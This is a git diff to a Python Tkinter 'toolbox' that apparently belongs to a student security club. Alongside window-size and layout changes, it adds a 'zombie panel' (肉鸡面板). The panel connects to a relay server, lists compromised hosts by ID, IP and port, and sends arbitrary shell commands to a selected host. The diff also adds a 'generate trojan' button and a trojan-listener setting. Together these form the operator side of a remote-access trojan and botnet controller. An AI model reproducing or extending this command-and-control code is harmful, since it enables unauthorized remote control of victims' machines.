@@ -1,21 +1,28 @@
 import re
+import time
+import chardet
+import socket
 import threading
 import queue
 import platform
 import getpass
 from tkinter import *
-from tkinter import colorchooser, scrolledtext
+from tkinter import colorchooser, scrolledtext, ttk
 from tkinter.ttk import Combobox
 from Chat_AI import *
 from fanyi import *
 
 # 一、定义主窗口
 root = Tk()
-root.title("自制综合成长型工具箱 - Daybreak网络安全协会")
+root.title("综合成长型工具箱 - Daybreak网络安全协会")
 img = PhotoImage(file='images/daybreak_logo.png')  # 替换为你的图标文件路径
 root.iconphoto(True, img)  # True 表示设置为应用程序图标，适用于所有窗口
 root.config(bg="white")  # 背景设置
-center_window(root, 1000, 500)  # 窗体的位置和长宽
+windowSize_json = get_windowSize_json()
+if check_json_null(windowSize_json):
+    center_window(root, windowSize_json['windowSize_Width'], windowSize_json['windowSize_Higths'])  # 窗体的位置和长宽
+else:
+    center_window(root, 1000, 500)  # 窗体的位置和长宽
 # 确保窗口已经初始化
 root.update()
 
@@ -38,6 +45,7 @@ text_id = canvas.create_text(canvas_width / 2, canvas_height * 0.05, text="自�
 ### 四、定义按钮的frame
 # 画布上定义frame，这里应该是按钮的frame
 frame = Frame(canvas, bg="grey", relief="solid", highlightbackground="red", highlightthickness=2)  # 创建 Frame
+frame_id = None     # 这里存放上面 画布中定义的 frame 的ID信息
 
 ### 五、菜单栏上定义临时笔记
 note_frame = None
@@ -50,6 +58,9 @@ local_cmd_frame = None
 
 ### 八、菜单栏上定义百度翻译
 baidu_fanyi_frame = None
+
+### 九、菜单栏上的肉鸡信息
+rouji_command_panel = None
 
 # 给Entry 控件添加提示信息
 def entry_Event(tool_Name,event_msg):
@@ -102,7 +113,7 @@ def add_Tools():
     color_label.grid(row=1, column=0, padx=(0, 10), sticky='e')
     tool_path = Entry(top)
     tool_path.grid(row=1, column=1, padx=(0, 10), sticky='we')
-    entry_Event(tool_path,"绝对/相对路径/文件夹路径/下载地址/工具地址")  # 给entry 控件添加一个提示信息
+    entry_Event(tool_path,"绝对/相对路径(a\\1.exe)/文件夹路径(a)/URL地址/工具地址")  # 给entry 控件添加一个提示信息
 
     # 3、工具分类
     command_label = Label(top, text="工具分类:")
@@ -390,8 +401,7 @@ def add_menus():
 
 # 清除画布内容，做刷新操作，加载界面、导航栏、按钮等
 def reload_canvas(menu_name):    # 更新画布
-    global frame
-    global config_ai_json
+    global frame, config_ai_json ,frame_id
 
     # 如果之前按钮的frame 还存在，则销毁
     if frame is not None:
@@ -413,7 +423,10 @@ def reload_canvas(menu_name):    # 更新画布
         # 4、隐藏百度翻译
         baidu_fanyi_frame.grid_forget()
 
-        # 5、显示笔记
+        # 5、隐藏肉鸡面板
+        rouji_command_panel.grid_forget()
+
+        # 6、显示笔记
         note_frame.grid(row=0, column=0, sticky="nsew", padx=10, pady=10)
     elif menu_name == "ai_ask":
         # 1、遍历 root 内的所有place子组件进行隐藏
@@ -430,7 +443,10 @@ def reload_canvas(menu_name):    # 更新画布
         # 4、隐藏百度翻译
         baidu_fanyi_frame.grid_forget()
 
-        # 5、判断api是否配置
+        # 5、隐藏肉鸡面板
+        rouji_command_panel.grid_forget()
+
+        # 6、判断api是否配置
         if config_ai_json_null_check(): # 配置好了进行ai展示
             # 显示ai对话模型
             AI_ask_frame.grid(row=0, column=0, sticky="nsew", padx=10, pady=10)
@@ -451,7 +467,10 @@ def reload_canvas(menu_name):    # 更新画布
         # 4、隐藏百度翻译
         baidu_fanyi_frame.grid_forget()
 
-        # 4、显示本地终端
+        # 5、隐藏肉鸡面板
+        rouji_command_panel.grid_forget()
+
+        # 6、显示本地终端
         local_cmd_frame.grid(row=0, column=0, sticky="nsew", padx=10, pady=10)
     elif menu_name == "baidu_fanyi":
         # 1、遍历 root 内的所有place子组件进行隐藏
@@ -468,14 +487,39 @@ def reload_canvas(menu_name):    # 更新画布
         # 4、隐藏本地终端
         local_cmd_frame.grid_forget()
 
-        # 5、展示百度翻译
+        # 5、隐藏肉鸡面板
+        rouji_command_panel.grid_forget()
+
+        # 6、展示百度翻译
         baidu_fanyi_frame.grid(row=0, column=0, sticky="nsew", padx=10, pady=10)
+    elif menu_name == "rouji_panel":
+
+        # 1、遍历 root 内的所有place子组件进行隐藏
+        for widget in root.winfo_children():
+            # 隐藏导航栏组件
+            if widget.winfo_manager() == "place":
+                widget.place_forget()
+        # 2、隐藏 临时笔记
+        note_frame.grid_forget()
+
+        # 3、隐藏ai对话
+        AI_ask_frame.grid_forget()
+
+        # 4、隐藏本地终端
+        local_cmd_frame.grid_forget()
+
+        # 5、隐藏百度翻译
+        baidu_fanyi_frame.grid_forget()
+
+        # 6、显示肉鸡面板
+        rouji_command_panel.grid(row=0, column=0, sticky="nsew", padx=10, pady=10)
     else:
         ## 隐藏 其他的菜单栏
         note_frame.grid_forget()  # 隐藏note临时笔记操作
         AI_ask_frame.grid_forget()  # 隐藏ai_ask对话模型
         local_cmd_frame.grid_forget()   # 隐藏本地终端
         baidu_fanyi_frame.grid_forget() # 隐藏百度翻译
+        rouji_command_panel.grid_forget()   # 隐藏肉鸡面板
 
         # 1、更新画布的文本为 菜单栏名称
         canvas.itemconfigure(text_id, text=menu_name, fill=get_menu_color_one(menu_name))
@@ -491,6 +535,10 @@ def reload_canvas(menu_name):    # 更新画布
 
         # 4、更新 get_canvas 列表中的当前 Frame
         frame = new_frame
+
+        # 绑定窗口拉伸
+        root.bind("<Configure>", lambda event, text_id=text_id, frame_id=frame_id: update_position(event, text_id, frame_id))
+
 
 # 设置AI_ask 配置
 def add_ai_setting():
@@ -521,20 +569,6 @@ def add_ai_setting():
     ai_API.grid(row=1, column=1, padx=(0, 10), sticky='we')  # 紧随label之后
     entry_Event(ai_API,"请输入ai模型的API")  # 给entry 控件添加一个提示信息
 
-    # 3、菜单栏下对应的颜色
-    def choose_color():
-        color_code = colorchooser.askcolor(title="选择颜色")
-        if color_code[1] is not None:
-            ai_color.config(text=color_code[1])  # 更新颜色显示
-            ai_color.config(bg=color_code[1])  # 更新颜色显示
-
-    # 调整按钮和标签的网格位置
-    ai_color_label = Button(ai_ask_config, text="背景颜色", command=choose_color)
-    ai_color_label.grid(row=2, column=0, padx=(0, 10), pady=(10, 0))  # 按钮放在第2行第0列
-
-    ai_color = Label(ai_ask_config, text="这里显示选择的颜色")
-    ai_color.grid(row=2, column=1, padx=(0, 10), pady=(10, 0), sticky='we')  # 标签放在第2行第1列
-
     # 四、设置保存按钮，以保存信息
     def save_button():
         # 做菜单栏名称和路径重复冲突的校验 以及其他的检验
@@ -546,11 +580,10 @@ def add_ai_setting():
 
         ai_names = ai_name.get()
         ai_APIs = ai_API.get()
-        ai_colors = ai_color.cget("text")
         # 校验
         if menu_name_path_check(ai_names):
             # 修改ai的json文件
-            update_ai_json(ai_names,ai_APIs,ai_colors)
+            update_ai_json(ai_names,ai_APIs)
 
             messagebox.showinfo("修改成功", f"API添加成功，重启使用 {ai_names} 的ai！")
             ai_ask_config.destroy()  # 关闭窗口
@@ -561,14 +594,131 @@ def add_ai_setting():
             messagebox.showinfo("修改失败！", f"配置文件中不存在 {ai_names} 的ai名称")
 
     save_button = Button(ai_ask_config, text="设置", command=save_button)
-    save_button.grid(row=3, columnspan=2, pady=10)
+    save_button.grid(row=2, columnspan=2, pady=10)
 
     # 五、确保行和列被正确地拉伸以适应内容
     ai_ask_config.grid_columnconfigure(1, weight=1)
     ai_ask_config.grid_rowconfigure(0, weight=1)
     ai_ask_config.grid_rowconfigure(1, weight=1)
     ai_ask_config.grid_rowconfigure(2, weight=1)
-    ai_ask_config.grid_rowconfigure(3, weight=1)
+
+# 设置木马监听
+def muma_listen_setting():
+    global client
+
+    messagebox.showinfo("前提条件","是否已经将将当前目录下的 server.py 文件放置于服务器，并开启监听。如果没有请开启监听之后在执行后面的操作")
+
+    # 一、获取全局变量
+
+    # 二、初始化子窗口
+    top = Toplevel(root)    # root的子窗口
+    top.title("设置服务端监听信息")
+    # top.iconbitmap("favicon.ico")
+    top.config(bg="white")  # 背景设置
+    top.resizable(False, False) # 禁止改变窗体大小
+    center_window(top, 400, 300)    # 窗体的位置和长宽
+    top.grab_set()       # 设置子窗口为模态，阻止对主窗口的操作
+
+    # 三、制作添加木马监听的子窗口
+    # 1、服务端IP信息
+    label = Label(top, text="服务端IP：")
+    label.grid(row=0, column=0, padx=(0, 10), sticky='e')  # 对齐到列的东侧
+    listen_ip = Entry(top)
+    listen_ip.grid(row=0, column=1, padx=(0, 10), sticky='we')  # 紧随label之后
+
+    # 2、服务端端口信息
+    label = Label(top, text="服务端端口：")
+    label.grid(row=1, column=0, padx=(0, 10), sticky='e')  # 对齐到列的东侧
+    listen_port = Entry(top)
+    listen_port.grid(row=1, column=1, padx=(0, 10), sticky='we')  # 紧随label之后
+
+    def save_button():
+        global client
+
+        server_IP = listen_ip.get()
+        server_Port = int(listen_port.get())
+        try:
+            # 创建tcp连接
+            client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)  # TCP连接
+            # 连接服务端
+            client.connect((server_IP, server_Port-1))
+            messagebox.showinfo("成功！","服务器配置成功！")
+            # 保存到文件中
+
+            json_info = {
+                "server_ip"     :   server_IP,
+                "server_port"   :   server_Port
+            }
+
+            save_server_json(json_info) # 保存信息到本地
+        except:
+            messagebox.showinfo("错误！","请正确填写信息！")
+
+    # 四、设置保存按钮，以保存信息
+    save_button = Button(top, text="测试连接", command=save_button)
+    save_button.grid(row=2, columnspan=1, pady=10)
+
+    # 五、确保行和列被正确地拉伸以适应内容
+    top.grid_columnconfigure(1, weight=1)
+    top.grid_rowconfigure(0, weight=1)
+    top.grid_rowconfigure(1, weight=1)
+
+# 设置启动窗口大小
+def windowSize_Setting():
+    # 一、获取全局变量
+
+    # 二、初始化子窗口
+    windowSize_config = Toplevel(root)    # root的子窗口
+    windowSize_config.title("设置启动窗口大小")
+    windowSize_config.config(bg="white")  # 背景设置
+    windowSize_config.resizable(False, False) # 禁止改变窗体大小
+    center_window(windowSize_config, 400, 200)    # 窗体的位置和长宽
+    windowSize_config.grab_set()     # 设置子窗口为模态，阻止对主窗口的操作
+
+    # 三、修改启动窗口大小的配置
+    # 1、选择启动窗口大小的宽度
+    windowSize_Width_label = Label(windowSize_config, text="启动窗口宽度:")
+    windowSize_Width_label.grid(row=0, column=0, padx=(0, 10), sticky='e')  # 对齐到列的东侧
+    windowSize_Width = Entry(windowSize_config)
+    windowSize_Width.grid(row=0, column=1, padx=(0, 10), sticky='we')  # 紧随label之后
+    entry_Event(windowSize_Width,f"{root.winfo_width()}")  # 给entry 控件添加一个提示信息
+
+    # 2、启动窗口大小的高度
+    windowSize_Higth_label = Label(windowSize_config, text="启动窗口高度:")
+    windowSize_Higth_label.grid(row=1, column=0, padx=(0, 10), sticky='e')  # 对齐到列的东侧
+    windowSize_Higth = Entry(windowSize_config)
+    windowSize_Higth.grid(row=1, column=1, padx=(0, 10), sticky='we')  # 紧随label之后
+    entry_Event(windowSize_Higth,f"{root.winfo_height()}")  # 给entry 控件添加一个提示信息
+
+    # 四、设置保存按钮，以保存信息
+    def save_button():
+        def check(windowSize_Widths, windowSize_Higths):
+            if windowSize_Widths < 0 and windowSize_Higths < 0:
+                return False
+            return True
+
+        windowSize_Widths = int(windowSize_Width.get())
+        windowSize_Higths = int(windowSize_Higth.get())
+        # 校验
+        if check(windowSize_Widths, windowSize_Higths):
+            update_windowSize_json(windowSize_Widths,windowSize_Higths)
+
+            messagebox.showinfo("保存成功", f"设置成功，重启后生效！")
+            windowSize_config.destroy()  # 关闭窗口
+
+            # root.destroy()  # 'root' 是主窗口的实例
+        else:
+            # 进行菜单栏名称重复警告
+            messagebox.showinfo("修改失败！", f"未知错误！")
+
+    save_button = Button(windowSize_config, text="设置", command=save_button)
+    save_button.grid(row=2, columnspan=2, pady=10)
+
+    # 五、确保行和列被正确地拉伸以适应内容
+    windowSize_config.grid_columnconfigure(1, weight=1)
+    windowSize_config.grid_rowconfigure(0, weight=1)
+    windowSize_config.grid_rowconfigure(1, weight=1)
+    windowSize_config.grid_rowconfigure(2, weight=1)
 
 # 展示菜单栏
 def show_menu():
@@ -582,7 +732,7 @@ def show_menu():
     menu_tool_add.add_command(label="添加工具", command=add_Tools)
     menu_tool_add.add_separator()
     menu_tool_add.add_command(label="AI模型设置", command=add_ai_setting)
-    menu_tool_add.add_separator()
+    menu_tool_add.add_command(label="启动窗口大小", command=windowSize_Setting)
     menu_bar.add_cascade(label="工具箱设置", menu=menu_tool_add)
 
     # 3、动态的添加菜单栏
@@ -597,6 +747,8 @@ def show_menu():
     menu_bar.add_cascade(label="汉英翻译", command=lambda menu_name="baidu_fanyi": reload_canvas(menu_name))
     # 添加本地终端
     menu_bar.add_cascade(label="本地终端", command=lambda menu_name="local_cmd": reload_canvas(menu_name))
+    # 肉鸡面板
+    menu_bar.add_cascade(label="肉鸡面板", command=lambda menu_name="rouji_panel": reload_canvas(menu_name))
     # 临时笔记
     menu_bar.add_cascade(label="临时笔记", command=lambda menu_name="note_nemu": reload_canvas(menu_name))
 
@@ -823,7 +975,11 @@ def create_note():
         if search_term:
             search_text(search_term)
     def on_ctrl_h(event):
+        # 在光标前插入一个空格
+        text_area.insert("insert", " ")
+        # 调用 on_search_replace 函数进行替换
         on_search_replace()
+
     def undo_action(event):
         text_area.edit_undo()
 
@@ -937,13 +1093,7 @@ def create_ai_ask():
     ai_frame = Frame(root, bg="white", highlightbackground="black", highlightthickness=1, relief="solid")
     ai_frame.grid(row=0, column=0, sticky="nsew", padx=10, pady=10)
     # 创建滚动文本框用于显示对话记录
-    try:
-        ai_color = get_ai_json_one_color(ai_name=get_ai_json_name_all()[0]) # 获取ai背景
-        if len(ai_color) == 0:
-            ai_color = "white"
-    except Exception as e:
-        ai_color = "white"
-    chat_box = scrolledtext.ScrolledText(ai_frame, wrap="word", bg=ai_color, fg="black", font=("SimSun", 12))
+    chat_box = scrolledtext.ScrolledText(ai_frame, wrap="word", bg="#D9D9D9", fg="black", font=("SimSun", 12))
     chat_box.grid(row=0, column=0, columnspan=2, sticky="nsew")
 
     # 禁止输入
@@ -1104,11 +1254,290 @@ def baidu_fanyi():
 
     # 更新百度翻译的 的frame
     baidu_fanyi_frame = fanyi_frame
-    # 隐藏ai_ask
+    # 隐藏百度翻译的 frame
     baidu_fanyi_frame.grid_forget()
 
+def rouji_panel():
+    global rouji_command_panel
+    global client
+
+    # 隐藏画布
+    # root.canvas.grid_forget()
+    def update_rouji_xinxi(rouji_xinxi):
+        # print("进行表格的更新")
+        # 获取 Treeview 中所有的子项ID 清空tree
+        items = tree.get_children()
+        if len(items) > 0:
+            # 遍历并删除每个子项
+            for item in items:
+                tree.delete(item)
+        # tree.delete("item_id") # 删除指定项
+        for rouji_id in list(rouji_xinxi.keys()):
+            tree.insert('', 'end', values=(rouji_id, rouji_xinxi[rouji_id]["rouji_ip"], rouji_xinxi[rouji_id]["rouji_port"]))
+    def get_rouji_json_xinxi():
+        global rouji_xinxi
+
+        if config_server_json_null_check():
+            # 发送命令和接收命令
+            client.send("rouji_json_xinxi".encode("UTF-8"))
+            rouji_xinxi = json.loads(client.recv(1024).decode("UTF-8"))
+            # 更新展示
+            update_rouji_xinxi(rouji_xinxi)
+            # 之后每5s 自动进行更新操作
+            root.after(5000, get_rouji_json_xinxi)
+        else:
+            messagebox.showinfo("错误","请先进行服务端的连接！\n请将工具箱目录下的server.py文件运行在放在双方都可访问的服务器上\n并配置服务端连接")
+
+    def popup_menu(event):
+        item_id = tree.identify_row(event.y)
+        if item_id:
+            tree.selection_set(item_id)  # 选择该行
+            rouji_ID = tree.item(item_id, 'values')[0]
+
+            # 创建弹出菜单
+            menu = Menu(root, tearoff=0)
+            # menu.add_command(label="编辑", command=lambda: print("编辑"))
+            menu.add_command(label="删除", command=lambda: delete_server_C(rouji_ID))
+            menu.add_separator()
+            menu.add_command(label="打开命令行", command=lambda: focus_command_line(rouji_ID))
+            menu.add_separator()
+            menu.add_command(label="刷新", command=lambda: get_rouji_json_xinxi())
+            # 在鼠标点击位置显示菜单
+            menu.post(event.x_root, event.y_root)
+
+    # 创建包含Treeview的Frame
+    rouji_frame = Frame(root, bg="white", highlightbackground="black", highlightthickness=1, relief="solid")
+    rouji_frame.grid(row=0, column=0, sticky="nsew", padx=10, pady=10)
+
+    # 创建分割窗口
+    paned_window = PanedWindow(rouji_frame, orient=VERTICAL)
+    paned_window.pack(expand=True, fill=BOTH)
+    # 创建Treeview控件
+    tree = ttk.Treeview(rouji_frame, columns=('ID','IP', 'Port'), show='headings')
+    tree.heading('ID', text='肉鸡ID')
+    tree.heading('IP', text='IP地址')
+    tree.heading('Port', text='端口')
+
+    tree.column('ID', width=50, anchor='center')
+    tree.column('IP', width=100, anchor='center')
+    tree.column('Port', width=50, anchor='center')
+
+    tree.insert('', 'end', values=("请刷新","请刷新","请刷新"))
+    # 将信息添加到Treeview中
+    # update_rouji_xinxi()
+    tree.bind("<Button-3>", popup_menu) # 绑定右键事件
+    paned_window.add(tree)  # 添加Treeview到分割窗口
+    # -------------------------------------------------------
+    ### 下方命令行控件
+    # -------------------------------------------------------
+    # 回车enter 事件
+    def focus_command_line(rouji_ID):
+        # 清空命令行
+        command_line.delete("1.0", END)
+        # 显示命令提示符
+        command_line.insert(END, f"{rouji_ID} #> ", "orange")
+        command_line.focus()  # 将焦点设置到命令行
+
+    def delete_server_C(rouji_ID):
+        # 发送命令
+        client.send(f"{rouji_ID} #> exit".encode("UTF-8"))
+        # 清空命令行
+        time.sleep(1)
+        command_line.delete("1.0", END)
+
+    def handle_return(event):
+        # 获取输入的命令
+        input_line = command_line.get("end-2c linestart", "end-1c").strip()
+        # 使用re.search查找匹配
+        match = input_line.split(' #> ')  # 切割 > 前后的内容变成数组
+        # 如果找到匹配项，输出匹配的内容
+        try:
+            if match[1]:
+                # 处理输入的命令
+                # print(input_line)
+                execute_command(match[0],match[1])
+        except Exception:
+            print("没有找到匹配的内容")
+        # 插入新的提示符
+        command_line.insert(END, f"{match[0]} #> ", "orange")
+        command_line.mark_set(INSERT, END)   # 将光标移动到提示符的后面
+        command_line.see(END)  # 滚动到最新行
+        return "break"
+    def execute_command(rouji_ID,command):
+        # 添加换行符以确保结果在新的一行开始
+        command_line.insert(END, "\n")
+        if command.startswith('cd '):
+            # change_directory(command[3:].strip())
+            change_directory(rouji_ID,command)
+        elif command == 'ls':
+            list_directory(rouji_ID,command)
+        elif command == 'pwd':
+            print_working_directory()
+        elif command == 'exit': # 已完成
+            # quit()
+            clear_screen()
+        elif command == 'clear':    # 已完成
+            clear_screen()
+        else:   # 已完成
+            run_system_command(rouji_ID,command)
+        # 将光标移动到提示符的后面
+        command_line.mark_set(INSERT, END)
+        command_line.see(END)  # 滚动到最新行
+    def change_directory(rouji_ID,command):
+        # 记录命令
+        change_dir = command[3:].strip()
+
+        # 发送命令
+        client.send(f"{rouji_ID} #> {command}".encode("UTF-8"))
+        # 发送命令后，准备接收工作
+        data = client.recv(4096)
+        encoding = chardet.detect(data)['encoding']     # chardet来进行编码设置
+        result = data.decode(encoding)
+
+        command_line.insert(END, result + "\n")
+    def list_directory(rouji_ID,command):
+        try:
+
+            # 发送指令 ls
+            client.send(f"{rouji_ID} #> {command}".encode("UTF-8"))
+            # 发送命令后，准备接收工作
+            data = client.recv(4096)
+            encoding = chardet.detect(data)['encoding']     # chardet来进行编码设置
+            files = data.decode(encoding)
+
+            # ----------------------------------
+            # files = os.listdir()
+            for file in files:
+                command_line.insert(END, f"{file}\n")
+        except PermissionError:
+            command_line.insert(END, "No permission to list directory contents\n")
+    def print_working_directory():
+        command_line.insert(END, f"{os.getcwd()}\n")
+    def run_system_command(rouji_ID,command):
+        try:
+            # 执行系统命令
+            # result = subprocess.run(command, shell=True, text=True, capture_output=True)
+            # 发送命令和接收命令
+            command_str = rouji_ID + " #> " + command
+
+            client.send(command_str.encode("UTF-8"))
+            # 发送命令后，准备接收工作
+            data = client.recv(4096)
+            encoding = chardet.detect(data)['encoding']     # chardet来进行编码设置
+            result = data.decode(encoding)
+            # 处理命令执行结果
+            # print(result)
+            # command_line.insert(END, result.stdout)
+            command_line.insert(END, result + "\n")
+            # if result.stderr:
+            #     command_line.insert(END, result.stderr)
+        except Exception as e:
+            command_line.insert(END, f"Error: {e}\n")
+    def clear_screen():
+        # 清除文本框中的所有内容
+        command_line.delete("1.0", END)
+    ### ----------------------------------------------------------------------
+    nav_frame_two = Frame(paned_window)
+    nav_frame_two.pack(expand=True, fill=X)  # 使用pack使其填充可用空间
+
+    # 配置行和列的权重
+    nav_frame_two.grid_rowconfigure(0, weight=3)  # 设定第一行的权重为3
+    nav_frame_two.grid_rowconfigure(1, weight=1)  # 设定第二行的权重为1（可选，如果有需要的情况下）
+    nav_frame_two.grid_columnconfigure(0, weight=1)  # 设定第一列的权重为1
+    nav_frame_two.grid_columnconfigure(2, weight=1)  # 设定第三列的权重为1
+
+    # 创建命令行控件
+    command_line = Text(nav_frame_two, height=10, bg="gray90", fg="black", font=("Microsoft YaHei", 10, "bold"))  # 使用Text控件作为命令行
+    command_line.grid(row=0, column=0, columnspan=6,sticky=NSEW)  # 使用grid使其填
+
+    # 绑定 enter 回车 事件
+    command_line.bind("<Return>", lambda event: handle_return(event))
+
+    # --------------------------------------------------------------------
+    def muma_listen_setting():
+        global client
+
+        server_IP = server_IP_entry.get()
+        server_Port = int(server_Port_entry.get())
+        try:
+            # 创建tcp连接
+            client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)  # TCP连接
+            # 设置连接超时时间为5秒
+            client.settimeout(5)
+            # 连接服务端
+            client.connect((server_IP, server_Port-1))
+            messagebox.showinfo("成功！","服务端连接成功！")
+            # 保存到文件中
+
+            json_info = {
+                "server_ip"     :   server_IP,
+                "server_port"   :   server_Port
+            }
+
+            save_server_json(json_info) # 保存信息到本地
+        except:
+            messagebox.showinfo("错误！","请正确填写信息！")
+
+    # 配置button_frame的列权重
+    label_IP = Label(nav_frame_two, text="连接IP:")
+    label_IP.grid(row=1, column=0, padx=(0, 50), sticky='e')  # 对齐到列的东侧
+    server_IP_entry = Entry(nav_frame_two)
+    server_IP_entry.grid(row=1, column=1, padx=(30, 0), sticky='w')  # 紧随label之后
+
+    label_Port = Label(nav_frame_two, text="连接端口:")
+    label_Port.grid(row=1, column=2, padx=(0, 50), sticky='e')  # 对齐到列的东侧
+    server_Port_entry = Entry(nav_frame_two)
+    server_Port_entry.grid(row=1, column=3, padx=(0, 0), sticky='w')  # 紧随label之后
+
+    button1 = Button(nav_frame_two, text="连接服务端", command=muma_listen_setting)
+    button1.grid(row=1, column=4, padx=(10, 10),sticky="w")
+
+    button2 = Button(nav_frame_two, text="生成木马", command=add_muma)
+    button2.grid(row=1, column=5, padx=(10, 10),sticky="w")
+
+    # ----------------------------------------------------------------------
+
+    paned_window.add(nav_frame_two)  # 添加命令行frame到分割窗口
+
+    # 更新百度翻译的 的frame
+    rouji_command_panel = rouji_frame
+    # 隐藏百度翻译的 frame
+    rouji_command_panel.grid_forget()
+
+def on_closing():
+    # 关闭客户端
+    try:
+        client.send("exit".encode("UTF-8"))
+        client.close()
+    except:
+        pass
+
+    # 清空服务端连接信息
+    delete_server_json()
+    root.destroy()
+
+
+# 定义一个方法来更新文本的水平位置，禁止上下间距改变
+def update_position(event, text_id, frame):
+    # 检查 canvas 是否有效
+    if not canvas.winfo_exists():
+        return
+
+    # 获取当前画布的实际宽度
+    canvas_width = canvas.winfo_width()
+
+    # 更新文本位置（水平居中，保持垂直位置不变）
+    y_position_text = canvas.coords(text_id)[1]  # 获取当前文本的y坐标，不改变
+    x_position_text = canvas_width / 2  # 水平居中
+    canvas.coords(text_id, x_position_text, y_position_text)
+
+    # 更新Frame的位置（水平居中，保持垂直位置不变）
+    y_position_frame = canvas.coords(frame)[1]  # 获取当前frame的y坐标，不改变
+    x_position_frame = canvas_width / 2  # 水平居中
+    canvas.coords(frame, x_position_frame, y_position_frame)
+
 def main():
-    global canvas
+    global canvas, root, text_id, frame_id
 
     # 在展示菜单栏前要先创建临时笔记
     create_note()
@@ -1119,8 +1548,11 @@ def main():
     # 再创建本地终端
     create_local_cmd()
 
-    # 在创建百度翻译
+    # 再创建百度翻译
     baidu_fanyi()
+
+    # 再创建肉鸡面板
+    rouji_panel()
 
     show_menu()     # 展示菜单栏
 
@@ -1130,6 +1562,12 @@ def main():
         reload_canvas(menu_name=menu_names[0])
     else:   # 在首页上写一些标语
         canvas.create_text(canvas_width / 2 , canvas_height * 0.05 + 130, text="Daybreak网络安全协会内部成长型工具箱", font=("Helvetica", 20), fill="lightgray", tags="my_text")
+        # 绑定窗口大小变化事件，触发文本位置更新
+        # root.bind("<Configure>", lambda event, text_ids=(text_id, text_id2): update_text_position(event, *text_ids))
+
+
+    # 绑定关闭事件
+    root.protocol("WM_DELETE_WINDOW", on_closing)  # 绑定关闭事件
 
     root.mainloop()  # 创建窗口视图
 
